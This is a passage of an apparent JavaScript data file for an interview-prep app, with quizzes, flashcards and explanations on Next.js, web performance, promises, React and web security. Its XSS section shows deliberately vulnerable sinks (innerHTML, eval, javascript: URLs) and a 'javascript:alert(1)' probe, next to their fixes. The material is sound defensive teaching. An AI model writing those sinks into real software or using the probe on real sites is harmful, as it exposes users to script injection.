    { q: "When should you add priority prop to next/image?", opts: ["All images", "Only the LCP (Largest Contentful Paint) image — the main hero/banner visible above fold. Priority disables lazy loading and adds preload link.", "Decorative images", "Images below the fold"], correct: 1, explain: "priority on the hero image: 1) Disables loading='lazy'. 2) Adds <link rel='preload'> in the head. 3) Sets fetchpriority='high'. The LCP image must load as fast as possible — lazy loading the LCP image is one of the most common performance mistakes." },
    { q: "What does the sizes prop do in next/image?", opts: ["Sets the CSS display size", "Tells the browser how wide the image will be at different viewports — helps browser pick the optimal source from srcset", "Sets maximum image size", "Controls the image quality"], correct: 1, explain: "sizes='(max-width: 768px) 100vw, 50vw' tells the browser: on mobile the image is full-width, on desktop it's half-width. Browser uses this with the generated srcset to download the smallest sufficient image. Without sizes, browser assumes 100vw and downloads larger versions than needed." },
    { q: "What is the blur placeholder in next/image and how do you enable it?", opts: ["A CSS blur filter", "A Base64-encoded low-quality image shown while the real image loads — add placeholder='blur' and optionally blurDataURL", "A loading spinner", "A CSS background color"], correct: 1, explain: "placeholder='blur': shows a blurry low-res version while the high-res image loads. For static imports, Next.js generates blurDataURL automatically. For dynamic images, provide your own blurDataURL (a tiny Base64 image). Much better UX than blank space — especially for above-fold images." },
  ],

  'edge-functions': [
    { q: "What is the Edge Runtime in Next.js?", opts: ["A CDN layer", "A lightweight JavaScript runtime that runs at edge nodes globally — faster cold starts than serverless, but has API restrictions (no Node.js built-ins)", "A database at the edge", "A CDN cache layer"], correct: 1, explain: "Edge Runtime: V8-based runtime deployed globally at CDN edge nodes. Cold start ~0ms (vs 100-500ms for serverless). Restrictions: no Node.js fs, crypto, etc. — only Web APIs. Ideal for: auth checks, redirects, A/B testing, geo-routing at low latency." },
    { q: "What is Next.js Middleware used for?", opts: ["API route middleware only", "Runs before every matching request — ideal for auth checks, redirects, rewriting URLs, A/B testing, geolocation without hitting the origin server", "Database queries", "Server-side rendering"], correct: 1, explain: "middleware.ts at the root runs on every request matching the config.matcher. Common uses: redirect unauthenticated users to /login, serve different content based on locale/geo, A/B test by rewriting to variant URLs, add security headers. Runs at edge before the page is served." },
    { q: "What is the key difference between Edge Functions and serverless functions?", opts: ["Edge functions are slower", "Edge: runs globally close to users, near-zero cold start, limited APIs. Serverless: full Node.js, slower cold start, single region by default.", "They are identical", "Serverless runs at edge"], correct: 1, explain: "Edge (Middleware, Edge API Routes): global deployment, <1ms cold start, no Node.js built-ins. Serverless (regular API routes): full Node.js, 100-500ms cold start, one region. Choose edge for latency-sensitive logic (auth, redirects). Choose serverless for complex logic needing Node.js APIs." },
    { q: "How do you restrict middleware to specific routes?", opts: ["With if statements only", "export const config = { matcher: ['/dashboard/:path*', '/api/:path*'] } — only runs on matching paths", "middleware runs on all routes always", "Using environment variables"], correct: 1, explain: "export const config = { matcher: ['/dashboard/:path*'] } — middleware only executes on /dashboard and all sub-paths. Without matcher, middleware runs on EVERY request including static files (_next/static) which wastes edge compute. Always add matcher for targeted middleware." },
  ],

  // ── Performance missing quizzes ──────────────────────────────────────
  'code-splitting': [
    { q: "What is the highest-ROI code splitting strategy?", opts: ["Split every component", "Route-based splitting — each route's bundle loads only when the user navigates to it. Users never download code for unvisited routes.", "Split utility functions", "Split node_modules only"], correct: 1, explain: "Route-based: const Dashboard = lazy(() => import('./Dashboard')). The /dashboard page's entire module graph only downloads on navigation to /dashboard. Most users visit only a few routes — they never download the rest. In Next.js App Router this is automatic." },
    { q: "What does React.lazy(() => import('./Component')) do?", opts: ["Renders the component slowly", "Creates a lazy component — the bundle containing Component is only downloaded when it first renders", "Makes the component async", "Adds a loading state automatically"], correct: 1, explain: "React.lazy wraps a dynamic import. The chunk isn't downloaded until React tries to render the component. Must be wrapped in <Suspense fallback={<Loading />}>. The fallback shows while the chunk downloads — usually very brief on subsequent visits (cached)." },
    { q: "What does webpackPrefetch: true comment do?", opts: ["Increases webpack bundle priority", "/* webpackPrefetch: true */ tells Webpack to fetch the chunk during browser idle time — navigation feels instant because chunk already downloaded", "Disables the chunk", "Adds the chunk to the main bundle"], correct: 1, explain: "import(/* webpackPrefetch: true */ './Dashboard') — Webpack adds <link rel='prefetch'> in HTML. Browser downloads the chunk during idle time. When user navigates, chunk is already cached — zero wait. Perfect for routes the user is likely to visit next." },
    { q: "When should you NOT code split a component?", opts: ["Never — always split", "When the component is small (<10KB), immediately needed, or on the critical rendering path — split overhead (extra request) outweighs savings", "When using TypeScript", "When using CSS modules"], correct: 1, explain: "Over-splitting creates many tiny chunks requiring extra network requests. Each dynamic import adds: DNS lookup, connection, request overhead. Only split components that are: large (>20KB), genuinely not needed on initial load, behind user interaction (modals, heavy charts, admin panels)." },
  ],

  'http2-3': [
    { q: "What was the 6-connection limit in HTTP/1.1 and why was it a problem?", opts: ["Browsers limited to 6 open connections globally", "Browsers limited to 6 parallel connections PER DOMAIN — more assets queue. A page with 30 assets sends them in batches of 6, stalling on each batch.", "Servers limited responses to 6 per second", "6 second timeout per request"], correct: 1, explain: "HTTP/1.1: max 6 parallel TCP connections per domain. 30 assets = 5 rounds of 6. Teams created workarounds: domain sharding (spread assets across 4 domains = 24 parallel), CSS sprites, JS bundling. HTTP/2 multiplexing made all these workarounds unnecessary." },
    { q: "How does HTTP/2 header compression (HPACK) work?", opts: ["Gzip on headers", "Both sides maintain a shared header table — subsequent requests only send changed headers as indexed diffs, not full headers", "Headers are removed entirely", "Headers are cached in the browser"], correct: 1, explain: "HTTP/1.1: every request sends 200-2000 bytes of repeated headers (Host, Accept, Cookie, User-Agent). HTTP/2 HPACK: first request builds the table, subsequent requests send diffs (header changed = send index + new value, unchanged = send index only). Saves 60-80% on header overhead." },
    { q: "What problem does HTTP/3/QUIC solve that HTTP/2 doesn't?", opts: ["HTTP/2 doesn't support multiplexing", "TCP head-of-line blocking — one lost packet stalls ALL streams. QUIC uses UDP with per-stream reliability: one lost packet only blocks that one stream.", "HTTP/2 doesn't support TLS", "HTTP/3 adds compression"], correct: 1, explain: "HTTP/2 multiplexes over ONE TCP connection. TCP is reliable — a lost packet triggers retransmission and ALL streams on that connection wait. On mobile with 2% packet loss, this causes frequent stalls. HTTP/3/QUIC: UDP-based, each stream independent — lost packet only stalls that stream." },
    { q: "What is server push in HTTP/2 and why was it largely abandoned?", opts: ["Server sends notifications", "Server proactively sends resources it thinks the client will need — but browsers already had caches, so push often sent already-cached resources wasting bandwidth", "Server compresses responses", "Server pre-warms connections"], correct: 1, explain: "HTTP/2 Server Push: server sends CSS/JS before client requests them. Sounded great in theory. Problem: server doesn't know what's in the client's cache — may push already-cached resources. Chrome removed support in 2022. Preload hints (<link rel='preload'>) achieve the same goal more efficiently." },
  ],

  'reflow-repaint': [
    { q: "What is the difference between reflow and repaint?", opts: ["They are the same", "Reflow (layout): recalculates positions and dimensions of elements. Repaint: redraws pixels without geometry changes. Reflow always triggers repaint. Repaint doesn't trigger reflow.", "Repaint is more expensive", "Reflow only happens on page load"], correct: 1, explain: "Reflow: changing width, height, margin, padding, font-size, adding/removing DOM nodes — browser recalculates layout for the affected element AND potentially its ancestors and descendants. Repaint: changing color, background, outline — browser redraws pixels with no layout change. Reflow >> repaint in cost." },
    { q: "Which CSS changes trigger ONLY repaint (not reflow)?", opts: ["width, height, margin", "color, background-color, border-color, outline, visibility (not display)", "font-size, padding, top/left", "transform, opacity"], correct: 1, explain: "Repaint only: visual changes with no geometry impact. color, background-color, outline, border-color, visibility (element space still reserved). transform and opacity are even cheaper — handled by GPU compositor, skip layout AND paint entirely." },
    { q: "What is layout thrashing and how do you fix it?", opts: ["Using too many CSS classes", "Alternating DOM reads (offsetWidth, getBoundingClientRect) and writes (style changes) in a loop — each read after a write forces synchronous reflow", "Nesting too many elements", "Using complex CSS selectors"], correct: 1, explain: "Read offsetWidth → write style.width → read offsetWidth → write: each read forces a synchronous layout because the write invalidated it. Fix: batch all reads first, then all writes. Or use requestAnimationFrame to separate read/write phases. FastDOM library automates this." },
    { q: "How do you move an element without triggering reflow?", opts: ["Use position:absolute with top/left", "Use transform: translate(x, y) — handled by GPU compositor, skips layout and paint entirely", "Use margin changes", "Use position:fixed"], correct: 1, explain: "top/left changes trigger reflow (layout recalculation). transform: translate() is handled by the compositor thread — no layout, no paint, just GPU compositing. Always prefer transform for animations. This is the #1 animation performance rule: only animate transform and opacity for 60fps." },
    { q: "What does will-change: transform do and when should you use it?", opts: ["Permanently speeds up the element", "Hints browser to promote element to GPU layer BEFORE animation starts — prevents mid-animation layer creation jank. Use sparingly.", "Forces hardware acceleration always", "Only works for 3D transforms"], correct: 1, explain: "Without will-change: browser creates GPU layer at animation start (causes brief jank). With will-change: transform: layer created in advance — animation starts instantly. Use sparingly: too many GPU layers waste VRAM. Add before animation starts, remove after it ends." },
  ],

  'promise-internals': [
    { q: "What are the three states of a Promise and can they be reversed?", opts: ["pending, resolved, rejected — reversible", "pending, fulfilled, rejected — transitions are ONE-WAY and irreversible. A fulfilled promise stays fulfilled forever.", "loading, success, error — reversible", "idle, running, done — reversible"], correct: 1, explain: "A Promise is a state machine: pending (initial) → fulfilled (resolved with value) OR rejected (failed with reason). Once settled (fulfilled or rejected), the state never changes. Calling resolve() on an already-settled promise has no effect." },
    { q: "What does Promise.then() always return?", opts: ["The same Promise", "A NEW Promise — resolved with the return value of the callback, or rejected if the callback throws", "undefined", "The original value"], correct: 1, explain: "Every .then() creates and returns a brand new Promise. This is what enables chaining: promise.then(a).then(b).then(c). Each .then() wraps the callback's return value. If the callback returns a Promise, the chain waits for it to settle before continuing." },
    { q: "What is the output order?\nPromise.resolve().then(() => console.log('A'));\nconsole.log('B');", opts: ["A, B", "B, A", "A, B simultaneously", "depends on browser"], correct: 1, explain: "Synchronous code always runs first. console.log('B') is sync. Promise.then() callbacks go to the microtask queue — they run AFTER the current synchronous code finishes. Output: B, A." },
    { q: "What happens if you don't return inside a .then() callback?", opts: ["Previous value passes through", "Next .then() receives undefined — the most common Promise chain bug", "The chain stops", "It throws an error"], correct: 1, explain: ".then(res => { res.json() }) — forgot return. Next handler gets undefined. .then(res => res.json()) — returns the Promise from res.json(), chain waits for it. Always return inside .then() when you're doing async work." },
    { q: "What is the difference between Promise.race() and Promise.any()?", opts: ["They are identical", "race: settles with the FIRST to settle (fulfilled OR rejected). any: settles with the FIRST to FULFILL — only rejects if ALL reject.", "any is deprecated", "race waits for all"], correct: 1, explain: "Promise.race: first to settle wins — if the fastest promise rejects, race rejects. Promise.any: first SUCCESSFUL promise wins — ignores rejections unless every single promise rejects (throws AggregateError). Use any for 'fastest successful response' patterns." },
    { q: "What is the Promise constructor anti-pattern (deferred anti-pattern)?", opts: ["Using async/await", "Wrapping a Promise-returning function in new Promise() unnecessarily: new Promise((res, rej) => fetch(url).then(res).catch(rej))", "Chaining .then()", "Using Promise.all"], correct: 1, explain: "Just return fetch(url) directly — it's already a Promise. new Promise() is only needed when wrapping callback-based APIs (setTimeout, fs.readFile, XMLHttpRequest). Wrapping existing Promises adds code, hides errors, and gains nothing." },
  ],

};

export const FLASHCARDS = [
  { q: "What is the difference between == and === in JavaScript?", a: "== uses abstract equality with type coercion ('5' == 5 → true). === uses strict equality — compares both value AND type. Always prefer === to avoid unexpected coercions." },
  { q: "Explain the difference between null and undefined", a: "undefined: variable declared but not assigned. null: intentional absence of value — explicitly set. typeof null === 'object' is a famous JS bug." },
  { q: "What is a closure?", a: "A function that retains access to variables from its outer lexical scope even after that scope finishes executing. It holds a live reference to variables — not a copy." },
  { q: "What triggers a browser reflow?", a: "Changing element dimensions, adding/removing DOM nodes, changing font size, window resize, or reading layout properties like offsetHeight (forced synchronous layout)." },
  { q: "Explain CSP (Content Security Policy)", a: "An HTTP header that restricts which sources can execute scripts, load images, etc. Prevents XSS by blocking inline scripts:\nContent-Security-Policy: default-src 'self'" },
  { q: "What is the difference between LCP, INP, and CLS?", a: "LCP: when main content appears (loading performance).\nINP: response time to user input (interactivity).\nCLS: how much content unexpectedly shifts (visual stability)." },
  { q: "When does React.memo NOT prevent a re-render?", a: "React.memo does shallow comparison. Fails when: 1) props are new object/array references each render, 2) children prop changes, 3) subscribed context changes." },
  { q: "What is the difference between preload and prefetch?", a: "preload: high-priority fetch for current-page resources needed soon. prefetch: low-priority hint for future-page resources. Preload can delay other resources; prefetch does not." },
  { q: "What is CSRF and how do SameSite cookies prevent it?", a: "CSRF tricks users into making authenticated cross-site requests. SameSite=Strict blocks cookies on all cross-site requests. SameSite=Lax allows GET but blocks POST/state-changing requests." },
  { q: "Explain Promise.all vs Promise.allSettled vs Promise.race", a: "Promise.all: resolves when ALL resolve, rejects on FIRST failure.\nPromise.allSettled: waits for ALL, returns each outcome.\nPromise.race: settles with the FIRST promise (pass or fail).\nPromise.any: first success, rejects only if ALL fail." },
  { q: "What is the difference between debounce and throttle?", a: "Debounce: waits until a pause in calls, then fires once (e.g. search input).\nThrottle: fires at most once per interval regardless of call frequency (e.g. scroll handler)." },
  { q: "Explain the difference between async/await and Promise chains", a: "Both handle async code. async/await is syntactic sugar over Promises. It's more readable, easier to use in try/catch, and handles sequential async operations cleanly. Under the hood it's the same microtask queue." },
];

export const CONTENT = {
  'event-loop': {
    explanation: `The Event Loop is JavaScript's mechanism for handling asynchronous operations despite being single-threaded.

When JS runs, it has:
- Call Stack — where your code executes (LIFO)
- Web APIs — browser APIs like setTimeout, fetch, DOM events
- Microtask Queue — for Promise callbacks (high priority)
- Macrotask Queue — for setTimeout, setInterval (low priority)

The loop works like this:
1. Execute all synchronous code on the call stack
2. Drain the entire microtask queue (Promises)
3. Take ONE task from the macrotask queue (setTimeout)
4. Repeat

This is why Promise.then() always runs before setTimeout even with 0ms delay.`,
    tips: `TIP 1: When asked "what's the output", always trace sync → microtasks → macrotasks in that order.

TRAP: Candidates assume setTimeout(fn, 0) runs immediately after the current line. It doesn't — it waits for the entire call stack AND all microtasks to clear first.

BONUS: In Node.js, process.nextTick() runs before Promise microtasks — a subtle difference from browsers that trips up senior candidates.`,
    code: `// ❌ Common misconception
console.log('1');
setTimeout(() => console.log('2'), 0);
Promise.resolve().then(() => console.log('3'));
console.log('4');
// Output: 1, 4, 3, 2
// NOT: 1, 2, 3, 4 — setTimeout loses to Promise microtasks

// ✅ Understanding microtask vs macrotask priority
async function fetchData() {
  // This .then() is a microtask
  const data = await fetch('/api/data');      // pauses here
  console.log('runs after microtask resolves'); // microtask
}

// ✅ Real-world: don't block the event loop
// ❌ Bad — blocks rendering for 500ms
function heavyWork() {
  const start = Date.now();
  while (Date.now() - start < 500) {}  // blocks everything!
}

// ✅ Good — yield to event loop between chunks
function heavyWorkAsync(items) {
  return new Promise(resolve => {
    const results = [];
    function processChunk(index) {
      for (let i = index; i < Math.min(index + 100, items.length); i++) {
        results.push(items[i] * 2);
      }
      if (index + 100 < items.length) {
        setTimeout(() => processChunk(index + 100), 0); // yield!
      } else {
        resolve(results);
      }
    }
    processChunk(0);
  });
}`
  },

  'hoisting': {
    explanation: `Hoisting is JavaScript's behavior of moving declarations to the top of their scope during compilation — before any code executes.

What gets hoisted:
- var declarations → hoisted AND initialized to undefined
- function declarations → hoisted completely (name + body)
- let/const → hoisted but NOT initialized (Temporal Dead Zone)
- class declarations → hoisted but in TDZ (like let)

The Temporal Dead Zone (TDZ) is the period between when a let/const variable is hoisted and when it's initialized. Accessing it throws a ReferenceError.`,
    tips: `TIP 1: Always use const by default, let when you need reassignment, never var — var hoisting causes bugs that are hard to trace.

TRAP: Candidates say "let and const are not hoisted." They ARE hoisted — they just aren't initialized. That's what TDZ is.

BONUS: Function expressions (const fn = function(){}) are NOT hoisted like function declarations — only the variable is hoisted, not the function body.`,
    code: `// var — hoisted and initialized to undefined
console.log(x); // undefined (no error!)
var x = 5;
console.log(x); // 5

// let — hoisted but in TDZ
console.log(y); // ❌ ReferenceError: Cannot access 'y' before initialization
let y = 5;

// ✅ Function declaration — fully hoisted
greet(); // "Hello!" — works fine
function greet() { console.log('Hello!'); }

// ❌ Function expression — NOT hoisted
sayHi(); // TypeError: sayHi is not a function
var sayHi = function() { console.log('Hi!'); };
// (var sayHi is hoisted as undefined, calling undefined() throws)

// ✅ Real-world: why this matters in loops
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 0); // prints 3, 3, 3 (var is hoisted to function scope)
}
for (let j = 0; j < 3; j++) {
  setTimeout(() => console.log(j), 0); // prints 0, 1, 2 (let is block-scoped)
}`
  },

  'closure-def': {
    explanation: `A closure is a function that remembers and accesses variables from its outer lexical scope even after that outer function has finished executing.

Every function in JavaScript is a closure — it always has access to:
1. Its own local variables
2. Variables in its outer function's scope
3. Global variables

Key insight: closures hold a REFERENCE to the variable, not a copy of its value. This is why the classic loop-with-var bug happens.

Common uses:
- Data privacy / encapsulation
- Function factories
- Memoization
- Event handlers with state`,
    tips: `TIP 1: When explaining closures, use a real example — counter, memoize, or module pattern. Never just define it abstractly.

TRAP: Candidates think closures copy the value. They capture the variable binding (reference). The loop bug (printing 3,3,3 with var) only makes sense if you understand this.

BONUS: Closures are how React hooks maintain state between renders — useState uses a closure over the state array index.`,
    code: `// ✅ Basic closure — counter with private state
function createCounter() {
  let count = 0; // private — can't access from outside
  return {
    increment: () => ++count,
    decrement: () => --count,
    getCount: () => count,
  };
}
const counter = createCounter();
counter.increment(); // 1
counter.increment(); // 2
console.log(counter.count); // undefined — truly private!

// ✅ Function factory
function multiply(multiplier) {
  return (num) => num * multiplier; // closes over 'multiplier'
}
const double = multiply(2);
const triple = multiply(3);
double(5); // 10
triple(5); // 15

// ✅ Memoization using closure
function memoize(fn) {
  const cache = {}; // lives in closure
  return function(...args) {
    const key = JSON.stringify(args);
    if (cache[key] !== undefined) return cache[key];
    cache[key] = fn(...args);
    return cache[key];
  };
}
const expensiveCalc = memoize((n) => n * n);
expensiveCalc(4); // calculates: 16
expensiveCalc(4); // from cache: 16 (no recalculation)`
  },

  'this-keyword': {
    explanation: `'this' in JavaScript refers to the execution context — who called the function. It's determined at call time, not definition time (except for arrow functions).

4 binding rules (in priority order):
1. new binding — new Foo() → this = new object
2. Explicit binding — call/apply/bind → this = specified object
3. Implicit binding — obj.method() → this = obj
4. Default binding — standalone fn() → this = undefined (strict) or window

Arrow functions have NO own 'this' — they inherit it from their enclosing lexical scope at definition time. This makes them great for callbacks.`,
    tips: `TIP 1: Always ask "how was this function called?" not "where was it defined?" — except for arrow functions where it's the opposite.

TRAP: Using a regular function as a setTimeout or event handler callback loses 'this'. Candidates forget to bind or use arrow functions.

BONUS: React class components require .bind(this) or arrow class fields because event handlers lose context. This is one reason functional components + hooks won the ecosystem.`,
    code: `// 4 binding rules
// 1. Default binding
function showThis() { console.log(this); }
showThis(); // undefined (strict) or window (non-strict)

// 2. Implicit binding
const obj = { name: 'Dev', greet() { console.log(this.name); } };
obj.greet(); // 'Dev' — obj is 'this'

// ❌ Losing implicit binding
const fn = obj.greet;
fn(); // undefined — no longer called on obj!

// 3. Explicit binding
fn.call(obj);        // 'Dev'
fn.apply(obj);       // 'Dev'
const bound = fn.bind(obj);
bound();             // 'Dev' — permanently bound

// 4. new binding
function Person(name) { this.name = name; }
const p = new Person('Alice'); // this = new object

// ✅ Arrow function — lexical this
class Timer {
  constructor() { this.count = 0; }

  // ❌ Regular function loses 'this'
  startBad() {
    setInterval(function() {
      this.count++; // this = undefined!
    }, 1000);
  }

  // ✅ Arrow function captures 'this' from class
  startGood() {
    setInterval(() => {
      this.count++; // this = Timer instance ✓
    }, 1000);
  }
}`
  },

  'promise-internals': {
    explanation: `A Promise represents a value that may be available now, in the future, or never. Internally it's a state machine with 3 states:

- Pending → initial state
- Fulfilled → operation succeeded (has a value)
- Rejected → operation failed (has a reason)

State transitions are one-way and irreversible.

Promise resolution order:
1. Synchronous code runs first
2. .then() callbacks go to the microtask queue
3. Microtasks drain completely before any setTimeout

Promise.then() always returns a NEW Promise, enabling chaining. Each .then() receives the return value of the previous one.`,
    tips: `TIP 1: Know all 4 static methods cold — Promise.all, allSettled, race, any — and the exact failure behavior of each.

TRAP: Forgetting to return inside a .then() chain. Without return, the next .then() gets undefined instead of the resolved value.

BONUS: async/await is syntactic sugar — under the hood it compiles to Promise chains. An async function always returns a Promise even if you return a plain value.`,
    code: `// ✅ Promise states
const p = new Promise((resolve, reject) => {
  // pending here
  setTimeout(() => resolve('done'), 1000);
  // now fulfilled
});

// ❌ Common mistake — forgetting to return
fetch('/api/user')
  .then(res => {
    res.json(); // forgot return! next .then gets undefined
  })
  .then(user => console.log(user)); // undefined 😢

// ✅ Always return
fetch('/api/user')
  .then(res => res.json()) // return the promise
  .then(user => user.name)
  .then(name => console.log(name)); // 'Alice' ✓

// ✅ Promise combinators
const [user, posts, comments] = await Promise.all([
  fetch('/api/user').then(r => r.json()),
  fetch('/api/posts').then(r => r.json()),
  fetch('/api/comments').then(r => r.json()),
]); // fails fast if any rejects

// ✅ allSettled — never fails, always returns all results
const results = await Promise.allSettled([
  Promise.resolve('ok'),
  Promise.reject('error'),
]);
// [{status:'fulfilled',value:'ok'}, {status:'rejected',reason:'error'}]

// ✅ Promise.any — first success wins
const fastest = await Promise.any([
  fetch('https://api1.example.com'),
  fetch('https://api2.example.com'),
]); // whichever responds first`
  },

  'fiber': {
    explanation: `React Fiber is the complete rewrite of React's reconciliation engine introduced in React 16. It solves the core problem with the old stack reconciler: rendering was synchronous and couldn't be interrupted.

Old reconciler problems:
- Once it started reconciling, it ran to completion
- Long renders would block the main thread
- No way to prioritize urgent updates (like user input) over less urgent ones (like data fetching)

Fiber solution:
- Breaks rendering work into small units called "fibers"
- Can pause, resume, abort, or reuse work
- Assigns priority levels to different updates
- Enables Concurrent Mode, Suspense, and useTransition`,
    tips: `TIP 1: Fiber enables two phases — Render phase (interruptible, builds work-in-progress tree) and Commit phase (synchronous, applies changes to DOM). Side effects only happen in commit phase.

TRAP: Confusing reconciliation with rendering. Reconciliation is diffing the virtual DOM — rendering is writing to the real DOM. They're separate phases.

BONUS: This is why React 18's useTransition works — you can mark state updates as "transitions" (low priority) so urgent updates like typing aren't blocked.`,
    code: `// ✅ useTransition — Fiber's priority system in action
import { useState, useTransition } from 'react';

function SearchPage() {
  const [query, setQuery] = useState('');
  const [results, setResults] = useState([]);
  const [isPending, startTransition] = useTransition();

  const handleSearch = (e) => {
    // Urgent — update input immediately (high priority)
    setQuery(e.target.value);

    // Non-urgent — defer heavy list update (low priority)
    startTransition(() => {
      setResults(filterLargeList(e.target.value)); // can be interrupted!
    });
  };

  return (
    <>
      <input value={query} onChange={handleSearch} />
      {isPending && <Spinner />}  {/* shows while fiber is working */}
      <ResultsList results={results} />
    </>
  );
}

// ✅ Suspense — another Fiber feature
function App() {
  return (
    <Suspense fallback={<Loading />}>
      <UserProfile />  {/* can suspend while fetching */}
    </Suspense>
  );
}`
  },

  'useeffect-deep': {
    explanation: `useEffect runs side effects after React commits changes to the DOM. Understanding when it runs and why is critical for avoiding bugs.

Execution timing:
- [] (empty) — runs once after first render
- [dep1, dep2] — runs after renders where deps changed
- No array — runs after EVERY render (usually wrong)
- Cleanup function — runs before next effect AND on unmount

Stale closure problem: if your effect captures a variable but doesn't list it as a dependency, it will use the old (stale) value from when the effect was created.

Rules of Hooks:
1. Only call at top level (not inside loops/conditions)
2. Only call from React functions`,
    tips: `TIP 1: If your effect has a dependency that changes every render (like an object or function), you need to memoize it with useMemo/useCallback first.

TRAP: Omitting a dependency from the array to "prevent too many runs." This creates stale closures and subtle bugs. Fix the root cause instead.

BONUS: useEffect is for synchronization, not lifecycle. Think "sync this side effect with this state" not "run on mount/unmount."`,
    code: `// ✅ Basic cleanup — prevent memory leaks
useEffect(() => {
  const controller = new AbortController();

  fetch('/api/data', { signal: controller.signal })
    .then(res => res.json())
    .then(setData)
    .catch(err => {
      if (err.name !== 'AbortError') setError(err);
    });

  return () => controller.abort(); // cleanup on unmount
}, []);

// ❌ Stale closure bug
function Counter() {
  const [count, setCount] = useState(0);

  useEffect(() => {
    const id = setInterval(() => {
      setCount(count + 1); // ❌ 'count' is stale! always 0+1=1
    }, 1000);
    return () => clearInterval(id);
  }, []); // missing 'count' dependency

// ✅ Fix with functional update (no dependency needed)
  useEffect(() => {
    const id = setInterval(() => {
      setCount(c => c + 1); // ✅ always uses latest value
    }, 1000);
    return () => clearInterval(id);
  }, []);
}

// ✅ Event listener cleanup
useEffect(() => {
  const handleResize = () => setWidth(window.innerWidth);
  window.addEventListener('resize', handleResize);
  return () => window.removeEventListener('resize', handleResize);
}, []);`
  },

  'xss': {
    explanation: `Cross-Site Scripting (XSS) is an attack where malicious scripts are injected into your web page and executed in victims' browsers.

3 types:
- Stored XSS — malicious script saved in DB, served to all users
- Reflected XSS — script in URL parameter, reflected back in response
- DOM-based XSS — script executed via client-side DOM manipulation

Common attack vectors:
- innerHTML with user content
- document.write()
- eval() with user input
- href/src attributes with javascript: URLs
- dangerouslySetInnerHTML in React

Impact: steal cookies/tokens, keylogging, redirect users, deface site`,
    tips: `TIP 1: CSP (Content-Security-Policy) header is your strongest XSS defense at the browser level — it blocks inline scripts entirely.

TRAP: Thinking React's JSX protects you everywhere. It does escape {userInput} in JSX, but dangerouslySetInnerHTML bypasses all protection.

BONUS: Even with React, you can get XSS via href={userInput} — if a user enters "javascript:alert(1)" as a URL, it executes. Always validate URLs with URL() constructor.`,
    code: `// ❌ XSS vulnerabilities
element.innerHTML = userInput;           // executes <script> tags
document.write(userInput);              // same
eval(userInput);                        // direct execution
element.href = userInput;               // javascript: URLs

// In React:
<div dangerouslySetInnerHTML={{ __html: userInput }} />  // ❌

// ✅ Safe alternatives
element.textContent = userInput;        // always safe — no HTML parsing
element.setAttribute('data-val', userInput); // safe for data attributes

// ✅ Safe link handling in React
function SafeLink({ href, children }) {
  const isValid = (url) => {
    try {
      const parsed = new URL(url);
      return ['http:', 'https:'].includes(parsed.protocol);
    } catch { return false; }
  };
  return isValid(href)
    ? <a href={href}>{children}</a>
    : <span>{children}</span>; // refuse javascript: URLs
}

// ✅ Content Security Policy header (strongest defense)
// In Express:
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'; object-src 'none';"
    // blocks ALL inline scripts and external script sources
  );
  next();
});

// ✅ If you must render HTML — sanitize first
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput); // strips dangerous tags`
  },

  'cwv': {
    explanation: `Core Web Vitals are Google's metrics for user experience, directly impacting SEO rankings.

LCP (Largest Contentful Paint) — loading performance
- Measures: when the largest visible element renders
- Good: < 2.5s | Needs work: 2.5–4s | Poor: > 4s
- Usually: hero image, large text block, video poster

INP (Interaction to Next Paint) — interactivity  
- Measures: time from user input to next paint
- Good: < 200ms | Needs work: 200–500ms | Poor: > 500ms
- Replaced FID in March 2024

CLS (Cumulative Layout Shift) — visual stability
- Measures: unexpected layout shifts during page life
- Good: < 0.1 | Needs work: 0.1–0.25 | Poor: > 0.25
- Common cause: images without dimensions, late-loading ads`,
    tips: `TIP 1: For LCP — preload your hero image with <link rel="preload"> and avoid lazy-loading it. It's the most impactful single fix.

TRAP: Adding loading="lazy" to ALL images including above-the-fold ones. Lazy loading the LCP image is one of the most common performance mistakes.

BONUS: CLS is often caused by fonts — use font-display: swap and reserve space with size-adjust. Also always set width/height on images.`,
    code: `// ✅ Fix LCP — preload hero image
<link rel="preload" as="image" href="/hero.webp" fetchpriority="high" />

// ✅ Fix LCP — don't lazy load above-fold images
<img src="/hero.webp" fetchpriority="high" />  {/* NOT loading="lazy" */}
<img src="/below-fold.webp" loading="lazy" />   {/* lazy is fine below fold */}

// ✅ Fix CLS — always reserve image dimensions
<img src="photo.jpg" width="800" height="600" alt="" />
/* CSS */
img { aspect-ratio: 800/600; width: 100%; height: auto; }

// ✅ Fix CLS — font loading
@font-face {
  font-family: 'MyFont';
  src: url('font.woff2');
  font-display: swap;     /* prevents invisible text flash */
  size-adjust: 105%;      /* matches fallback font size to reduce shift */
}

// ✅ Fix INP — break up long tasks
// ❌ Bad — 200ms long task blocks input response
function handleClick() {
  processList(10000items); // blocks for 200ms
}

// ✅ Good — yield to browser between chunks
async function handleClick() {
  for (const chunk of chunks(items, 100)) {
    processChunk(chunk);
    await scheduler.yield(); // let browser paint + handle input
  }
}`
  },

  'auth-patterns': {
    explanation: `Authentication patterns define how identity is verified and maintained across requests.

JWT (JSON Web Tokens):
- Stateless — server doesn't store sessions
- Self-contained — carries user data in payload
- Risk: can't be invalidated before expiry (use short expiry + refresh tokens)
- Store: access token in memory, refresh token in httpOnly cookie

Session-based:
- Stateful — server stores session in DB/Redis
- Easy to invalidate (just delete the session)
- Scales less easily (need shared session store)

Refresh token rotation:
- Short-lived access token (15min) + long-lived refresh token (7 days)
- Each refresh issues a new refresh token and invalidates the old
- Detects token theft via reuse detection`,
    tips: `TIP 1: Never store JWTs in localStorage — it's accessible to any JS on the page (XSS vulnerability). Use httpOnly cookies for refresh tokens.

TRAP: Making JWT expiry too long (like 7 days) "for convenience." If stolen, attacker has 7 days of access with no way to revoke.

BONUS: The "none" algorithm attack — always explicitly specify the algorithm when verifying JWTs. Never trust the algorithm specified in the token header.`,
    code: `// ✅ Secure auth pattern with refresh token rotation

// Server — issue tokens
app.post('/login', async (req, res) => {
  const user = await verifyCredentials(req.body);

  const accessToken = jwt.sign(
    { id: user.id, role: user.role },
    process.env.JWT_SECRET,
    { expiresIn: '15m', algorithm: 'HS256' } // always specify algorithm!
  );
  const refreshToken = jwt.sign(
    { id: user.id },
    process.env.JWT_REFRESH_SECRET,
    { expiresIn: '7d' }
  );

  // ✅ Refresh token in httpOnly cookie (XSS-safe)
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,    // JS can't read it
    secure: true,      // HTTPS only
